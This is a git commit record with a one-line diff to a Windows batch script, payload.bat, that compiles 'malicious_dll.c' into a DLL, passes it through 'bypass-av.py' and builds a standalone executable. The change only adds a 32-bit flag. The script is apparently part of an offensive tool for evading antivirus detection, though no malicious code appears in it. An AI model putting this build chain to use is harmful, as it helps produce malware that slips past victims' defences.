8d77645b9229eb3bcf7f081f8418574f62848693
pistacchietto <pistacchietto2@gmail.com>
2019-03-25 12:44:02 +0100

    ok

--- payload.bat
+++ payload.bat
@@ -1,3 +1,3 @@
 gcc.exe malicious_dll.c -IC:\Python27\include -LC:\Python27\libs -lpython27 -shared -o payload.dll -m32
 python bypass-av.py --library=payload.dll --function=payload --output=standalone_payload.c
-gcc.exe standalone_payload.c -o standalone_payload.exe
+gcc.exe standalone_payload.c -o standalone_payload.exe -m32
